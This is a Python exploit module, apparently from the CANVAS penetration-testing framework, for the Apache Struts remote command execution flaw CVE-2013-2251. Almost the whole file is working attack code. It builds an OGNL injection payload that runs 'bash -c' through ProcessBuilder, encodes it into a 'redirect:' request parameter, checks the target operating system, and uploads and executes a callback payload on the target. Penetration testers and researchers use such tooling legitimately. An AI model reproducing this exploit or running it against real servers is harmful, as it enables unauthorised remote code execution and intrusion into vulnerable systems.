#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# http://www.immunityinc.com/CANVAS/ for more information

# python imports
import sys
import string
import logging

# path appends
if '.' not in sys.path:
    sys.path.append('.')

# CANVAS imports
from ExploitTypes.php_multi import *
from exploitutils import *
import canvasengine
from ExploitTypes.CommandLineExecuter import CommandExploit
from libs.canvasos import canvasos


NAME                            = "Apache Struts 2.0.0 - 2.3.15 RCE"
DESCRIPTION                     = "A vulnerability introduced by manipulating parameters prefixed with action:/redirect:/redirectAction: allows remote command execution"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Apache"
DOCUMENTATION["Repeatability"]  = "Infinite"
DOCUMENTATION["CVE Name"]       = "CVE-2013-2251"
DOCUMENTATION["CVE Url"]        = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2251"
DOCUMENTATION["References"]     = "https://cwiki.apache.org/confluence/display/WW/S2-016"

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["Linux"] ]
PROPERTY['VERSION']             = ["2.0.0 - 2.3.15"]

NOTES                           = """

This exploits abuses a ONGL injection issue in Struts2 to obtain RCE

It was tested on struts2-showcase 2.3.15

"""

CHANGELOG                       = """
"""


class theexploit(tcpexploit, CommandExploit):
    def __init__(self):
        CommandExploit.__init__(self)
        tcpexploit.__init__(self)
        self.name = NAME
        self.host = None
        self.port = 8080
        self.path = "struts2-showcase/fileupload/upload.action"
        self.supports_universal = True
        self.UA=spkproxy.UserAgent("")

    def usage(self):
        logging.info("Example: " + sys.argv[0] + " -t 172.16.104.128 -p 80 -l 10.10.10.227 -d 5555 -O path:struts2-showcase/fileupload/upload.action")
        logging.info("-t <target ip>")
        logging.info("-p <target port>")
        logging.info("-l <local ip>")
        logging.info("-d <local port>")
        logging.info("-O path:<foo/bar.action>")

    def getargs(self):
        tcpexploit.getargs(self)
        self.getargs_cle()
        self.getarg("path")


    def neededListenerTypes(self):
        return self.cle_neededListenerTypes()

    def run_blind_command(self, command):
        logging.debug("Running command (blind): %s" % command)

        payload = "%%{(new java.lang.ProcessBuilder(new java.lang.String[]{'bash','-c','%s'})).start()}" % command
        logging.debug("Payload: %s" % payload)

        data=self.UA.GET("?redirect:http://%s" % "".join("%{0:0>2}".format(format(ord(char), "x")) for char in payload))
        #self.log("Data=%s"%data)

        return True

    def run(self):
        self.getargs()
        logging.debug("Host: " + self.host)
        logging.debug("Port: " + str(self.port))
        logging.debug("Command: " + str(self.command))


        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        self.UA=spkproxy.UserAgent(protocol+"://"+self.host+":"+str(self.port)+"/"+self.path, auth=None, hostname=self.host, exploit=self)
        self.UA.addHeader("User-Agent", "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT;)")

        self.socknode = self.argsDict["passednodes"][0]
        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port), showlog=1)

        logging.debug("Trying to get a mosdef node")
        self.get_os()
        if self.target_os.base == "Unknown":
            logging.error("Error while retrieving information on the target OS")
            self.setProgress(-1)
            self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port))
            return 0
        if self.target_os.base != "Linux":
            logging.error("Target OS not supported")
            self.setProgress(-1)
            self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port))
            return 0
        result = self.upload_and_execute()
        if result:
            self.setProgress(100)
            self.setInfo("%s attacking %s:%d (success)"%(self.name,self.host,self.port))
            self.succeeded = 1
        else:
            self.setProgress(-1)
            self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port))
        return result

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    standard_callback_commandline(app)
